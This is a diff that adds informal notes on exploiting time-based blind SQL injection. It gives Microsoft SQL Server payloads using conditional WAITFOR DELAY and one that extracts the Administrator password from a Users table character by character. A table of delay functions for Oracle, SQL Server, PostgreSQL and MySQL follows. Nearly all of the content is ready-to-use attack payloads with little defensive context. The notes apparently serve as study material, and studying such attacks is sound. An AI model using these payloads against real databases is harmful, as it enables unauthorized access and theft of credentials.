@@ -1,0 +1,32 @@
+it is often possible to exploit blind sql injection vulnerabillity by triggering time delays depending on whether an injected condition is tru or false
+
+in microsoft server you can use this:
+
+'; IF (1=2) WAITFOR DELAY '0:0:10'--  //will not trigger a delay because the condition is false
+'; IF (1=1) WAITFOR DELAY '0:0:10'--  //evaluates to true so there will be a ten seconds delay
+
+now we can retrieve the data we want one character at a time..
+
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+
+
+
+
+
+
+
+
+
+Time delays
+
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+
+Oracle 
+	dbms_pipe.receive_message(('a'),10)
+Microsoft 
+	WAITFOR DELAY '0:0:10'
+PostgreSQL 
+	SELECT pg_sleep(10)
+MySQL 	
+SELECT SLEEP(10) 
